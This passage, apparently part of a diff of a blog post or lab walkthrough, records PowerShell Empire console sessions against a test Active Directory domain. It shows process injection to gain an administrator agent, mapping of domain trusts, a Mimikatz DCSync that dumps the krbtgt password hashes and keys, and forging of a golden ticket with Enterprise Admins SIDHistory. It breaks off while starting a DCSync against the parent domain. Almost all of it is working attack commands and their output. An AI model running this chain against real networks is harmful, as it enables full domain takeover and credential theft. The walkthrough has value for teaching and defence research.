+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;request (default, none, or other).<br/>
+<br/>
+(Empire: management/psinject) &gt; set ProcId 2584<br/>
+(Empire: management/psinject) &gt; set Listener AttackerKBExample<br/>
+(Empire: management/psinject) &gt; run<br/>
+(Empire: management/psinject) &gt;<br/>
+Job started: Debug32_2ywkz<br/>
+[+] Initial agent HX2Y4KAS34TVVHKN from 172.16.102.12 now active<br/>
+<br/>
+<br/>
+(Empire: management/psinject) &gt; agents<br/>
+<br/>
+[*] Active agents:<br/>
+<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Internal IP &nbsp; &nbsp; Machine Name &nbsp; &nbsp;Username &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Process &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay &nbsp; &nbsp;Last Seen<br/>
+&nbsp; --------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;----------- &nbsp; &nbsp; ------------ &nbsp; &nbsp;--------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----- &nbsp; &nbsp;--------------------<br/>
+&nbsp; VBVAF1FS13DZVGG1 &nbsp; 172.16.102.12 &nbsp; CLIENT2K8 &nbsp; &nbsp; &nbsp; *RESEARCH\justauser powershell/2808 &nbsp; &nbsp; 5/0.0 &nbsp; &nbsp;2015-10-10 05:49:00<br/>
+&nbsp; HX2Y4KAS34TVVHKN &nbsp; 172.16.102.12 &nbsp; CLIENT2K8 &nbsp; &nbsp; &nbsp; *RESEARCH\Administracmd/2584 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;5/0.0 &nbsp; &nbsp;2015-10-10 05:48:57<br/>
+<br/>
+<b>Mapping Domain Trusts</b>&nbsp; <br/>
+(Empire: agents) &gt; interact HX2Y4KAS34TVVHKN<br/>
+(Empire: HX2Y4KAS34TVVHKN) &gt; usemodule situational_awareness/network/mapdomaintrusts<br/>
+(Empire: situational_awareness/network/mapdomaintrusts) &gt; info<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Name: Invoke-MapDomainTrusts<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Module: situational_awareness/network/mapdomaintrusts<br/>
+&nbsp; &nbsp; &nbsp;NeedsAdmin: False<br/>
+&nbsp; &nbsp; &nbsp; OpsecSafe: True<br/>
+&nbsp; &nbsp;MinPSVersion: 2<br/>
+&nbsp; &nbsp; &nbsp;Background: True<br/>
+OutputExtension: None<br/>
+<br/>
+Authors:<br/>
+&nbsp; @harmj0y<br/>
+<br/>
+Description:<br/>
+&nbsp; Maps all reachable domain trusts with .CSV output. Part of<br/>
+&nbsp; PowerView.<br/>
+<br/>
+Options:<br/>
+<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Required &nbsp; &nbsp;Value &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Description<br/>
+&nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------- &nbsp; &nbsp;------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -----------<br/>
+&nbsp; Agent &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;HX2Y4KAS34TVVHKN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Agent to run module on.<br/>
+&nbsp; LDAP &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Switch. Use LDAP for domain queries<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(less accurate).<br/>
+<br/>
+(Empire: situational_awareness/network/mapdomaintrusts) &gt; run<br/>
+(Empire: situational_awareness/network/mapdomaintrusts) &gt;<br/>
+Job started: Debug32_7j2pj<br/>
+<br/>
+<br/>
+"SourceDomain","TargetDomain","TrustType","TrustDirection"<br/>
+"research.sittingduck.info","sittingduck.info","ParentChild","Bidirectional"<br/>
+"sittingduck.info","research.sittingduck.info","ParentChild","Bidirectional"<br/>
+<br/>
+<br/>
+Invoke-MapDomainTrusts completed<br/>
+<br/>
+<b>DCSync &nbsp;</b><br/>
+(Empire: situational_awareness/network/mapdomaintrusts) &gt; usemodule credentials/mimikatz/dcsync<br/>
+<br/>
+<br/>
+(Empire: credentials/mimikatz/dcsync) &gt; info<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Name: Invoke-Mimikatz DCsync<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Module: credentials/mimikatz/dcsync<br/>
+&nbsp; &nbsp; &nbsp;NeedsAdmin: False<br/>
+&nbsp; &nbsp; &nbsp; OpsecSafe: True<br/>
+&nbsp; &nbsp;MinPSVersion: 2<br/>
+&nbsp; &nbsp; &nbsp;Background: True<br/>
+OutputExtension: None<br/>
+<br/>
+Authors:<br/>
+&nbsp; @gentilkiwi<br/>
+&nbsp; @JosephBialek<br/>
+<br/>
+Description:<br/>
+&nbsp; Runs PowerSploit's Invoke-Mimikatz function to extract a<br/>
+&nbsp; given account password through Mimikatz's lsadump::dcsync<br/>
+&nbsp; module. This doesn't need code execution on a given DC, but<br/>
+&nbsp; needs to be run from a user context with DA equivalent<br/>
+&nbsp; privileges.<br/>
+<br/>
+Options:<br/>
+<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Required &nbsp; &nbsp;Value &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Description<br/>
+&nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------- &nbsp; &nbsp;------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -----------<br/>
+&nbsp; domain &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Specified (fqdn) domain to pull for the<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;primary domain/DC.<br/>
+&nbsp; user &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username to extract the hash for<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(domain\username format).<br/>
+&nbsp; Agent &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;HX2Y4KAS34TVVHKN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Agent to run module on.<br/>
+&nbsp; dc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Specified (fqdn) domain controller to<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;pull replication data from.<br/>
+<br/>
+(Empire: credentials/mimikatz/dcsync) &gt; set user RESEARCH\krbtgt<br/>
+(Empire: credentials/mimikatz/dcsync) &gt; run<br/>
+<br/>
+<br/>
+<br/>
+Job started: Debug32_hmch1<br/>
+<br/>
+Hostname: CLIENT2K8.research.sittingduck.info / S-1-5-21-1931688288-432673180-3111857317<br/>
+&nbsp; .#####. &nbsp; mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 23 2015 23:05:23)<br/>
+&nbsp;.## ^ ##.<br/>
+&nbsp;## / \ ## &nbsp;/* * *<br/>
+&nbsp;## \ / ## &nbsp; Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br/>
+&nbsp;'## v ##' &nbsp; http://blog.gentilkiwi.com/mimikatz &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (oe.eo)<br/>
+&nbsp; '#####' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; with 16 modules * * */<br/>
+<br/>
+<br/>
+mimikatz(powershell) # lsadump::dcsync /user:RESEARCH\krbtgt<br/>
+[DC] 'research.sittingduck.info' will be the domain<br/>
+[DC] 'RDC1.research.sittingduck.info' will be the DC server<br/>
+<br/>
+[DC] 'RESEARCH\krbtgt' will be the user account<br/>
+<br/>
+Object RDN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; : krbtgt<br/>
+<br/>
+** SAM ACCOUNT **<br/>
+<br/>
+SAM Username &nbsp; &nbsp; &nbsp; &nbsp; : krbtgt<br/>
+Account Type &nbsp; &nbsp; &nbsp; &nbsp; : 30000000 ( USER_OBJECT )<br/>
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )<br/>
+Account expiration &nbsp; :<br/>
+Password last change : 10/9/2015 5:43:33 PM<br/>
+Object Security ID &nbsp; : S-1-5-21-1931688288-432673180-3111857317-502<br/>
+Object Relative ID &nbsp; : 502<br/>
+<br/>
+Credentials:<br/>
+&nbsp; Hash NTLM: 859d7b2ffdf34f7f56fffd547925c0af<br/>
+&nbsp; &nbsp; ntlm- 0: 859d7b2ffdf34f7f56fffd547925c0af<br/>
+&nbsp; &nbsp; lm &nbsp;- 0: 996738f7e7cdd11a68d2b4a2fe4e6bf4<br/>
+<br/>
+Supplemental Credentials:<br/>
+* Primary:Kerberos-Newer-Keys *<br/>
+&nbsp; &nbsp; Default Salt : RESEARCH.SITTINGDUCK.INFOkrbtgt<br/>
+&nbsp; &nbsp; Default Iterations : 4096<br/>
+&nbsp; &nbsp; Credentials<br/>
+&nbsp; &nbsp; &nbsp; aes256_hmac &nbsp; &nbsp; &nbsp; (4096) : 09411aeb7d8b39559ba4521c522e509ce16bdddfa001024f8d1da0c843ed0522<br/>
+&nbsp; &nbsp; &nbsp; aes128_hmac &nbsp; &nbsp; &nbsp; (4096) : 04c9e44b61bcaf87495fe29bf2aa345f<br/>
+&nbsp; &nbsp; &nbsp; des_cbc_md5 &nbsp; &nbsp; &nbsp; (4096) : d56149929bc13261<br/>
+<br/>
+* Primary:Kerberos *<br/>
+&nbsp; &nbsp; Default Salt : RESEARCH.SITTINGDUCK.INFOkrbtgt<br/>
+&nbsp; &nbsp; Credentials<br/>
+&nbsp; &nbsp; &nbsp; des_cbc_md5 &nbsp; &nbsp; &nbsp; : d56149929bc13261<br/>
+<br/>
+* Packages *<br/>
+&nbsp; &nbsp; Kerberos-Newer-Keys<br/>
+<br/>
+* Primary:WDigest *<br/>
+&nbsp; &nbsp; 01 &nbsp;756a3c6c76e9ba6acd9208b1a5ff80ce<br/>
+&nbsp; &nbsp; 02 &nbsp;a528871c70120bb10f27b5877b6c1be4<br/>
+&nbsp; &nbsp; 03 &nbsp;f9d38cc0aa612e7d6a008bdc89b09daa<br/>
+&nbsp; &nbsp; 04 &nbsp;756a3c6c76e9ba6acd9208b1a5ff80ce<br/>
+&nbsp; &nbsp; 05 &nbsp;a528871c70120bb10f27b5877b6c1be4<br/>
+&nbsp; &nbsp; 06 &nbsp;b3af56940244a4256db94cf57b32767d<br/>
+&nbsp; &nbsp; 07 &nbsp;756a3c6c76e9ba6acd9208b1a5ff80ce<br/>
+&nbsp; &nbsp; 08 &nbsp;27ad21674ab73bc8126a29aeb41a74b6<br/>
+&nbsp; &nbsp; 09 &nbsp;27ad21674ab73bc8126a29aeb41a74b6<br/>
+&nbsp; &nbsp; 10 &nbsp;9e454eadbd580bfeb7c41fdb1bff0e1f<br/>
+&nbsp; &nbsp; 11 &nbsp;cd589cdf4116662da0f16ead11e290b6<br/>
+&nbsp; &nbsp; 12 &nbsp;27ad21674ab73bc8126a29aeb41a74b6<br/>
+&nbsp; &nbsp; 13 &nbsp;6d8ceea0939080b76a8ae7fae554e9af<br/>
+&nbsp; &nbsp; 14 &nbsp;cd589cdf4116662da0f16ead11e290b6<br/>
+&nbsp; &nbsp; 15 &nbsp;efb50d51a296e70fcea2b3f1efe4ac2b<br/>
+&nbsp; &nbsp; 16 &nbsp;efb50d51a296e70fcea2b3f1efe4ac2b<br/>
+&nbsp; &nbsp; 17 &nbsp;c7521ac39670987d9ebed743f93bf7f3<br/>
+&nbsp; &nbsp; 18 &nbsp;3c9aa63050ca91a30e5f68cd6620b4f0<br/>
+&nbsp; &nbsp; 19 &nbsp;5da798120a891a96c3710abad24002b9<br/>
+&nbsp; &nbsp; 20 &nbsp;5861af374439b4696e4d8bb06dbcd809<br/>
+&nbsp; &nbsp; 21 &nbsp;319a6483e069066801d8db3c1f31c26a<br/>
+&nbsp; &nbsp; 22 &nbsp;319a6483e069066801d8db3c1f31c26a<br/>
+&nbsp; &nbsp; 23 &nbsp;5954c4ddcb87981ed4c49c3e20b85aa4<br/>
+&nbsp; &nbsp; 24 &nbsp;a964c8de05b627b0fd428c31f97dde74<br/>
+&nbsp; &nbsp; 25 &nbsp;a964c8de05b627b0fd428c31f97dde74<br/>
+&nbsp; &nbsp; 26 &nbsp;1d4619443926b677ebf4b101dae82464<br/>
+&nbsp; &nbsp; 27 &nbsp;61a262a0d587052b6cd09e06bb3bcb90<br/>
+&nbsp; &nbsp; 28 &nbsp;6655ab4cbadfb45b814759e307c2a0bc<br/>
+&nbsp; &nbsp; 29 &nbsp;f21137140f07639a56233baba238c3f8<br/>
+<br/>
+<br/>
+(Empire: credentials/mimikatz/dcsync) &gt; creds<br/>
+<br/>
+Credentials:<br/>
+<br/>
+&nbsp; CredID &nbsp;CredType &nbsp; Domain &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; UserName &nbsp; &nbsp; &nbsp; &nbsp; Host &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Password<br/>
+&nbsp; ------ &nbsp;-------- &nbsp; ------ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------- &nbsp; &nbsp; &nbsp; &nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; --------<br/>
+&nbsp; 1 &nbsp; &nbsp; &nbsp; hash &nbsp; &nbsp; &nbsp; research.sittingduck.infokrbtgt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RDC1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 859d7b2ffdf34f7f56fffd547925c0af<br/>
+<br/>
+<br/>
+<b>Finding parent domain's SID</b>&nbsp; <br/>
+(Empire: credentials/mimikatz/dcsync) &gt; usemodule management/user_to_sid<br/>
+(Empire: management/user_to_sid) &gt; info<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Name: User-to-SID<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Module: management/user_to_sid<br/>
+&nbsp; &nbsp; &nbsp;NeedsAdmin: False<br/>
+&nbsp; &nbsp; &nbsp; OpsecSafe: True<br/>
+&nbsp; &nbsp;MinPSVersion: 2<br/>
+&nbsp; &nbsp; &nbsp;Background: False<br/>
+OutputExtension: None<br/>
+<br/>
+Authors:<br/>
+&nbsp; @harmj0y<br/>
+<br/>
+Description:<br/>
+&nbsp; Converts a specified domain\user to a domain sid.<br/>
+<br/>
+Options:<br/>
+<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Required &nbsp; &nbsp;Value &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Description<br/>
+&nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------- &nbsp; &nbsp;------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -----------<br/>
+&nbsp; Domain &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Domain name for translation.<br/>
+&nbsp; User &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username for translation.<br/>
+&nbsp; Agent &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;HX2Y4KAS34TVVHKN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Agent to run module on.<br/>
+<br/>
+(Empire: management/user_to_sid) &gt; set Domain sittingduck.info<br/>
+(Empire: management/user_to_sid) &gt; set User krbtgt<br/>
+(Empire: management/user_to_sid) &gt; run<br/>
+S-1-5-21-2988714168-2756154285-2485713731-502<br/>
+<br/>
+<b>Generating Golden Ticket with parent domain SIDHistory for Enterprise Admins</b><br/>
+(Empire: management/user_to_sid) &gt; usemodule credentials/mimikatz/golden_ticket<br/>
+(Empire: credentials/mimikatz/golden_ticket) &gt; info<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Name: Invoke-Mimikatz Golden Ticket<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Module: credentials/mimikatz/golden_ticket<br/>
+&nbsp; &nbsp; &nbsp;NeedsAdmin: False<br/>
+&nbsp; &nbsp; &nbsp; OpsecSafe: True<br/>
+&nbsp; &nbsp;MinPSVersion: 2<br/>
+&nbsp; &nbsp; &nbsp;Background: True<br/>
+OutputExtension: None<br/>
+<br/>
+Authors:<br/>
+&nbsp; @JosephBialek<br/>
+&nbsp; @gentilkiwi<br/>
+<br/>
+Description:<br/>
+&nbsp; Runs PowerSploit's Invoke-Mimikatz function to generate a<br/>
+&nbsp; golden ticket and inject it into memory.<br/>
+<br/>
+Options:<br/>
+<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Required &nbsp; &nbsp;Value &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Description<br/>
+&nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------- &nbsp; &nbsp;------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -----------<br/>
+&nbsp; CredID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CredID from the store to use for ticket<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;creation.<br/>
+&nbsp; domain &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; The fully qualified domain name.<br/>
+&nbsp; user &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username to impersonate.<br/>
+&nbsp; groups &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Optional comma separated group IDs for<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;the ticket.<br/>
+&nbsp; sid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; The SID of the specified domain.<br/>
+&nbsp; krbtgt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; krbtgt NTLM hash for the specified<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;domain<br/>
+&nbsp; sids &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; External SIDs to add as sidhistory to<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;the ticket.<br/>
+&nbsp; id &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; id to impersonate, defaults to 500.<br/>
+&nbsp; Agent &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;HX2Y4KAS34TVVHKN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Agent to run module on.<br/>
+&nbsp; endin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Lifetime of the ticket (in minutes).<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Default to 10 years.<br/>
+<br/>
+<br/>
+<br/>
+(Empire: credentials/mimikatz/golden_ticket) &gt; set CredID 1<br/>
+(Empire: credentials/mimikatz/golden_ticket) &gt; set sids S-1-5-21-2988714168-2756154285-2485713731-519<br/>
+(Empire: credentials/mimikatz/golden_ticket) &gt; set user Administrator<br/>
+(Empire: credentials/mimikatz/golden_ticket) &gt; run<br/>
+(Empire: credentials/mimikatz/golden_ticket) &gt;<br/>
+Job started: Debug32_40sz1<br/>
+<br/>
+Hostname: CLIENT2K8.research.sittingduck.info / S-1-5-21-1931688288-432673180-3111857317<br/>
+&nbsp; .#####. &nbsp; mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 23 2015 23:05:23)<br/>
+&nbsp;.## ^ ##.<br/>
+&nbsp;## / \ ## &nbsp;/* * *<br/>
+&nbsp;## \ / ## &nbsp; Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br/>
+&nbsp;'## v ##' &nbsp; http://blog.gentilkiwi.com/mimikatz &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (oe.eo)<br/>
+&nbsp; '#####' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; with 16 modules * * */<br/>
+<br/>
+<br/>
+mimikatz(powershell) # kerberos::golden /domain:research.sittingduck.info /user:Administrator /sid:S-1-5-21-1931688288-432673180-3111857317 /krbtgt:859d7b2ffdf34f7f56fffd547925c0af /sids:S-1-5-21-2988714168-2756154285-2485713731-519 /ptt<br/>
+User &nbsp; &nbsp; &nbsp;: Administrator<br/>
+Domain &nbsp; &nbsp;: research.sittingduck.info<br/>
+SID &nbsp; &nbsp; &nbsp; : S-1-5-21-1931688288-432673180-3111857317<br/>
+User Id &nbsp; : 500<br/>
+Groups Id : *513 512 520 518 519<br/>
+Extra SIDs: S-1-5-21-2988714168-2756154285-2485713731-519 ;<br/>
+ServiceKey: 859d7b2ffdf34f7f56fffd547925c0af - rc4_hmac_nt<br/>
+Lifetime &nbsp;: 10/10/2015 5:55:42 AM ; 10/7/2025 5:55:42 AM ; 10/7/2025 5:55:42 AM<br/>
+-&gt; Ticket : ** Pass The Ticket **<br/>
+<br/>
+&nbsp;* PAC generated<br/>
+&nbsp;* PAC signed<br/>
+&nbsp;* EncTicketPart generated<br/>
+&nbsp;* EncTicketPart encrypted<br/>
+&nbsp;* KrbCred generated<br/>
+<br/>
+Golden ticket for 'Administrator @ research.sittingduck.info' successfully submitted for current session<br/>
+<br/>
+(Empire: credentials/mimikatz/golden_ticket) &gt;<br/>
+<br/>
+<b>DCSync with Golden Ticket against parent domain &nbsp;</b><br/>
+(Empire: HX2Y4KAS34TVVHKN) &gt; usemodule credentials/mimikatz/dcsync<br/>
+(Empire: credentials/mimikatz/dcsync) &gt; info<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Name: Invoke-Mimikatz DCsync<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Module: credentials/mimikatz/dcsync<br/>
+&nbsp; &nbsp; &nbsp;NeedsAdmin: False<br/>
+&nbsp; &nbsp; &nbsp; OpsecSafe: True<br/>
+&nbsp; &nbsp;MinPSVersion: 2<br/>
+&nbsp; &nbsp; &nbsp;Background: True<br/>
+OutputExtension: None<br/>
+<br/>
+Authors:<br/>
+&nbsp; @gentilkiwi<br/>
+&nbsp; @JosephBialek<br/>
+<br/>
+Description:<br/>
+&nbsp; Runs PowerSploit's Invoke-Mimikatz function to extract a<br/>
+&nbsp; given account password through Mimikatz's lsadump::dcsync<br/>
+&nbsp; module. This doesn't need code execution on a given DC, but<br/>
+&nbsp; needs to be run from a user context with DA equivalent<br/>
+&nbsp; privileges.<br/>
+<br/>
+Options:<br/>
+<br/>
